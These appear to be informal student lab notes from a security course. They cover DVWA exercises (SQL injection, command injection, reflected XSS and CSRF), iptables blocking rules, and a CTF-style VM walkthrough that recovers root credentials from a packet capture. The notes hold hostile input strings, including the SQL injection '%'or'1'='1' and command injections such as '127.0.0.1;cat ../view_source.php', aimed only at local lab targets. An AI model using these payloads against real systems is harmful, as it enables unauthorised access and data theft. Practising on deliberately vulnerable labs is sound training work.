 --> Now goto http://127.0.0.1/dvwa/login.php
 --> give the username as admin and password as password 
 --> In DVWA Security set impossible to low and submit
 --> Go to SQL Injection and type 1 enter
 --> type 2 enter
 --> type %'or'1'='1

week4

> sudo service apache2 start
> goto DVWA Security and set impossible to low and submit
> now goto command Injection and do
  --> 127.0.0.1;ls
  --> 127.0.0.1;ls../
  --> 127.0.0.1;cat ../view_source.php
  --> 127.0.0.1&&net user
  --> 127.0.0.1&net user
> go to cmd
  > ping 0.0.0.0&&net user
  > ping 0.0.0.0&net user
 
--> Now goto XSS(Reflected) and in the text box give 
	type hello word
	--> hello hello world
	type <script>alert<'hello world'></script>
	--> It shows a pop with hello world and click ok

--> Now crf>And change the password with new password and select the change button or login or submit
	> click on the test_credential and give username and new username 
	--> the username admin is valid

Week5
now goto kali
> ifconfig
> sudo service apache2 start
   -->password: kali

In cmd 
> ipconfig 
   --> it shows bunch of ipaddress and now ipv4 address(any one of them mainly Lanless or ethernet VMware (net1 or 8)

In kali
> sudo iptables -A INPUT -s <ip_address> -j DROP  (to block the ping packets in windows)
Now goto cmd
> ping <ip_address of kali>
  --> timeout timeout timeout   (if you can open localhost in windows to check)

In kalie (to unblock)
> sudo iptables -D INPUT -s <ip_address> -j DROP

To Block the ports
> sudo iptables -A INPUT -s <ip_address> -p tcp --destination-port 80 -j DROP

To Unblock the ports
> sudo iptables -D INPUT -s <ip_address> -p tcp --destination-port 80 -j DROP


week7

Go to rampriyakhilari github and download the CMROS.zip file and extract it in a folder and load the .ovf file in VMware

and give login enter  
	--> copy the ip_address of it
	--> It asks username and password
Now goto Zenmap or nmap 
and enter the scap and choose option to "scan all tcp ports"
 then copy the port 13652

Now go to kali linux default page by entering the ip_address in URL of firefox (in kali)
Right Click and select the View Page Source and copy the username and password to be test test

and goto vmware of CMROS and type login and enter and give 
---> username:test
---> password:test

Now goto winScp and enter the the protocol as Scp instead of SFTP
and give host name:ip_address
port: 13652
username:test
password:test
Click on the Login button 
and copy the cap.pcapng file to the desktop folder in kali and open it with WireShark 
	--> It give bunch of ip address but Right click the any tcp ip_address and select follow and only option it has
	--> It gives the credentials i.e., username and password so like root and 5grvvbfru (like that) so copy them
Go to vmware of CMROS
and type login and enter and
	--> username:root
	-->passoword:5g3rvvfbvgo234
so after entering the terminal 
> cd home/test/Desktop
> ls
